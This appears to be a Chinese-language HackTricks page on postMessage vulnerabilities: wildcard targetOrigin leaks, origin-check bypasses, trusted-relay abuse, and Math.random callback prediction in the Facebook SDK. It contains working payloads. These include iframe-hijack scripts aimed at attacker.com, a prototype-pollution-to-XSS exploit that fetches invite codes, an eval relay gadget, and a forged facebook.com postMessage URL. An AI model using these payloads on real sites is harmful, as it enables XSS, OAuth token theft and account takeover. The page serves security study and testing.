# PostMessage 漏洞

{{#include ../../banners/hacktricks-training.md}}

## 发送 **PostMessage**

**PostMessage** 使用以下函数发送消息：
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
注意 **targetOrigin** 可以是 '\*'，也可以是像 _https://company.com_ 这样的 URL。\
在 **第二种情形** 下，**消息只能被发送到该域**（即使 Window 对象的 origin 不同）。\
如果使用了 **wildcard**，**消息可能被发送到任意域**，并会被发送到 Window 对象的 origin。

### 针对 **targetOrigin** 中的 iframe 与 wildcard 的攻击

如 [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) 所述，如果你发现一个可以被 **iframed** 的页面（没有 `X-Frame-Header` 保护），并且该页面通过 **postMessage** 使用 **wildcard** (\*) 发送 **敏感消息**，你可以 **修改** **iframe** 的 **origin**，并将该 **敏感消息** leak 到你控制的域。\
注意，如果页面可以被 iframed，但 **targetOrigin** 被 **设置为一个 URL 而不是 wildcard**，那么这个 **技巧不会生效**。
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener 利用

**`addEventListener`** 是 JS 用来声明一个**期望接收 `postMessages`**的函数。  
会使用类似下面的代码：
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### 枚举

为了在当前页面中 **查找事件监听器（event listeners）**，你可以：

- **在 JS 代码中搜索** `window.addEventListener` 和 `$(window).on` (_JQuery version_)
- **在开发者工具控制台执行**: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **在浏览器的开发者工具中前往** Elements --> Event Listeners

![](<../../images/image (396).png>)

- 使用像 [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) 或 [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) 这样的浏览器扩展。这些扩展会**拦截所有消息**并向你展示它们。

### Origin 检查绕过（Origin check bypasses）

- **`event.isTrusted`** 属性被认为是安全的，因为它只有在事件由真实用户操作生成时才返回 `True`。虽然如果正确实现很难绕过，但在安全检查中它很重要。
- 在 PostMessage 事件的 origin 验证中使用 **`indexOf()`** 可能容易被绕过。下面的例子说明了该类漏洞：

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- `String.prototype.search()` 中的 **`search()`** 方法是为正则表达式设计的，而不是字符串。传入非 regexp 的值会被隐式转换为正则，从而使该方法可能不安全。因为在正则中，点号 (.) 是通配符，允许通过精心构造的域名绕过验证。例如：

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- **`match()`** 函数与 `search()` 类似，处理的是正则。如果正则构造不当，可能会被绕过。
- **`escapeHtml`** 函数本意是通过转义字符来净化输入。然而，它不会创建一个新的转义对象，而是覆盖现有对象的属性。这种行为可以被利用。特别是，如果一个对象可以被操控使其受控属性不承认 `hasOwnProperty`，`escapeHtml` 将无法如预期工作。下面的例子说明了这一点：

- 预期失败（Expected Failure）:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- 绕过转义（Bypassing the escape）:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

在此类漏洞的上下文中，`File` 对象由于其只读的 `name` 属性而特别容易被利用。该属性在模板中使用时不会被 `escapeHtml` 净化，从而导致潜在的安全风险。

- JavaScript 中的 `document.domain` 属性可以被脚本设置为缩短域名，从而在同一父域内放宽同源策略（same-origin policy）的强制执行。

### 仅基于 Origin 的信任 + 受信中继（Origin-only trust + trusted relays）

如果接收方只检查 **`event.origin`**（例如，信任任何 `*.trusted.com`），你经常可以找到该 origin 上的一个**“中继”页面，它通过 `postMessage` 将攻击者可控的参数回显给指定的 `targetOrigin`/`targetWindow`**。示例包括接受查询参数并将 `{msg_type, access_token, ...}` 转发给 `opener`/`parent` 的营销/分析小部件。你可以：

- **在 popup/iframe 中打开受害者页面，使其有一个 `opener`**，从而让其处理程序注册（许多 pixel/SDK 只有在 `window.opener` 存在时才会附加监听器）。
- **将另一个攻击者窗口导航到受信任域上的中继端点**，填充你想注入的消息字段（消息类型、令牌、nonce 等）。
- 因为消息现在来自**受信任的 origin**，仅基于 origin 的验证通过，你就可以触发特权行为（状态更改、API 调用、DOM 写入）在受害者的监听器中执行。

野外观察到的滥用模式：

- Analytics SDKs（例如 pixel/fbevents-style）消费像 `FACEBOOK_IWL_BOOTSTRAP` 这样的消息，然后**使用消息中提供的令牌调用后端 API**，并在请求体中包含 **`location.href` / `document.referrer`**。如果你提供自己的令牌，你可以**在该令牌的请求历史/日志中读取这些请求**并外泄受害者页面 URL/referrer 中存在的 OAuth 代码/令牌。
- 任何将任意字段反射到 `postMessage` 的中继都允许你**伪造特权监听器期望的消息类型**。结合薄弱的输入验证，可以达到调用 Graph/REST、解锁功能或类似 CSRF 的流程。

狩猎提示：枚举那些只检查 `event.origin` 的 `postMessage` 监听器，然后寻找**在同一 origin 下将 URL 参数通过 `postMessage` 转发的 HTML/JS 端点**（营销预览、登录弹窗、OAuth 错误页面）。用 `window.open()` + `postMessage` 将两者串联起来以绕过 origin 检查。

### e.origin == window.origin 绕过

当使用 %%%%%% 在 sandboxed iframe 中嵌入网页时，关键在于理解 iframe 的 origin 会被设置为 `null`。这在处理 `sandbox` 属性及其对安全性和功能的影响时尤为重要。

在 `sandbox` 属性中指定 **`allow-popups`** 时，从 iframe 内打开的任何 popup 窗口都会继承其父级的 sandbox 限制。这意味着除非还包含 **`allow-popups-to-escape-sandbox`** 属性，否则 popup 窗口的 origin 也会被设置为 `null`，与 iframe 的 origin 保持一致。

因此，当在这些条件下打开 popup 并且从 iframe 使用 **`postMessage`** 向 popup 发送消息时，发送端和接收端的 origin 都被设置为 `null`。这种情况下 **`e.origin == window.origin`** 会评估为 true（`null == null`），因为 iframe 和 popup 共享相同的 `null` origin 值。

欲了解更多信息 **阅读**：


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### 绕过 e.source（Bypassing e.source）

可以检查消息是否来自脚本正在监听的同一个 window（在检查消息是否来自同一页面时对浏览器扩展的 Content Scripts 特别有趣）：
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
你可以通过创建一个**iframe**，该**iframe****发送** **postMessage** 并**立即删除**，将消息的 **`e.source`** 强制为 null。

更多信息请**阅读：**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header 绕过

为了执行这些攻击，理想情况下你应该能够将**目标网页**放入一个 `iframe` 中。但有些 header（例如 `X-Frame-Header`）会**阻止**这种**行为**。\
在这些情形中，你仍然可以使用一种不那么隐蔽的攻击。你可以打开一个新标签页访问易受攻击的 web 应用并与之通信：
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### 通过阻止主页面窃取发送到子 iframe 的消息

在下面的页面你可以看到如何在发送数据之前**阻止** **主** 页面，从而窃取发送到**子 iframe** 的**敏感 postmessage 数据**，并滥用**子页面中的 XSS** 在数据被接收之前 **leak the data**：

{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### 通过修改 iframe 的 location 窃取消息

如果你可以 iframe 一个没有 X-Frame-Header 的网页，而该网页又包含另一个 iframe，你可以**更改该子 iframe 的 location**，因此如果它正在接收使用 **postmessage** 发送且使用 **wildcard** 的消息，攻击者就可以**更改**该 iframe 的 **origin** 为其**控制** 的页面并**窃取**该消息：

{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### 通过 postMessage 导致 Prototype Pollution 和/或 XSS

在通过 `postMessage` 发送的数据被 JS 执行的场景中，你可以 iframe 该页面，并通过 `postMessage` 发送利用代码来利用 prototype pollution/XSS。

关于通过 `postMessage` 导致的 XSS，有几篇讲解得非常好的文章可见 [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

下面是一个通过向 `iframe` 发送 `postMessage` 来滥用 **Prototype Pollution 然后 XSS** 的利用示例：
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
欲了解 **更多信息**：

- 链接到关于 [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html) 的页面
- 链接到关于 [**XSS**](../xss-cross-site-scripting/index.html) 的页面
- 链接到关于 [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss) 的页面

### 受信任来源白名单不是安全边界

严格的 `event.origin` 检查只有在 **受信任来源无法运行 attacker JS** 的情况下才有效。当具有特权的页面嵌入第三方 iframes 并假定 `event.origin === "https://partner.com"` 是安全的时候，`partner.com` 中的任何 XSS 都会成为通向父页面的桥梁：
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
在真实环境中观察到的攻击模式：

1. **在合作方的 iframe 中利用 XSS** 并植入一个 relay gadget，使得任何 `postMessage` 在受信任的 origin 内变成 code exec：
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **From the attacker page**, 向被 compromised 的 iframe 发送 JS，该 iframe 将一个通过 allowlist 的允许 message 类型转发回 parent。该 message 源自 `partner.com`，通过了 allowlist，并携带被不安全插入的 HTML：
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. 父页面注入攻击者的 HTML，从而在父域中获得 JS 执行（例如 `facebook.com`），进而可用于窃取 OAuth codes 或者转向完整的账号接管流程。

Key takeaways:

- **合作方 origin 不是边界**：任何在“受信任”合作方的 XSS 都允许攻击者发送被允许的消息，从而绕过 `event.origin` 检查。
- 那些 **渲染合作方可控负载** 的处理器（例如在特定消息类型上使用 `innerHTML`）会使合作方被攻破时变成同源 DOM XSS。
- 宽泛的 **message surface**（多种类型、缺乏结构校验）在合作方 iframe 被攻破后提供更多用于 pivoting 的 gadgets。

### 预测 postMessage 桥中基于 **`Math.random()`** 的回调令牌

当消息校验使用由 `Math.random()` 生成的“shared secret”（例如 `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`）并且同一个 helper 也用于命名 plugin iframes 时，你可以恢复 PRNG 输出并伪造受信任的消息：

- **Leak PRNG outputs via `window.name`:** SDK 使用 `guid()` 自动命名 plugin iframes。如果你控制顶层 frame，将受害页面放入 iframe，然后把 plugin iframe 导航到你的源（例如 `window.frames[0].frames[0].location='https://attacker.com'`），并读取 `window.frames[0].frames[0].name` 来获取原始的 `Math.random()` 输出。
- **Force more outputs without reloads:** 一些 SDK 暴露了重新初始化路径；在 FB SDK 中，发起 `init:post` 并带上 `{xfbml:1}` 会强制 `XFBML.parse()`，销毁并重建 plugin iframe，从而生成新的 name/callback ID。重复的 reinit 可以产生任意数量的 PRNG 输出（注意内部还会为 callback/iframe IDs 调用额外的 `Math.random()`，因此求解器必须跳过其中的中间值）。
- **Trusted-origin delivery via parameter pollution:** 如果某个 first-party plugin endpoint 在跨窗口 payload 中反射了未消毒的参数（例如 `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`），你可以在保留受信任 `facebook.com` origin 的同时注入 `&type=...&iconSVG=...`。
- **Predict the next callback:** 将泄露的 iframe 名称转换回 `[0,1)` 区间的浮点数，并把若干值（即使不连续）输入到 V8 的 `Math.random` 预测器（例如基于 Z3 的）中。在本地生成下一个 `guid()` 以伪造预期的 callback token。
- **Trigger the sink:** 构造 postMessage 数据，使桥接调度 `xd.mpn.setupIconIframe` 并在 `iconSVG` 中注入 HTML（例如 URL 编码的 `<img src=x onerror=...>`），从而在托管 origin 内实现 DOM XSS；之后可以读取同源的 iframe（OAuth dialogs、arbiters 等）。
- **Framing quirks help:** 该链依赖于 framing。在某些移动 webviews 中，当存在 `frame-ancestors` 时，`X-Frame-Options` 可能降级为不受支持的 `ALLOW-FROM`，而“compat”参数可强制宽松的 `frame-ancestors`，从而启用 `window.name` 旁路通道。

#### 最小伪造消息示例
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## 参考资料

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- 练习： [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
